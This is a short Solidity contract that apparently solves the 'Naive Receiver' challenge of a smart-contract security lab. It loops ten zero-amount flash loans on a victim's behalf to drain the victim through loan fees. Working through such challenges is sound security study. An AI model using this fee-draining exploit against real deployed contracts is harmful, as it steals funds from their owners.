// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) public payable {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0 ether);
        }
    }
}
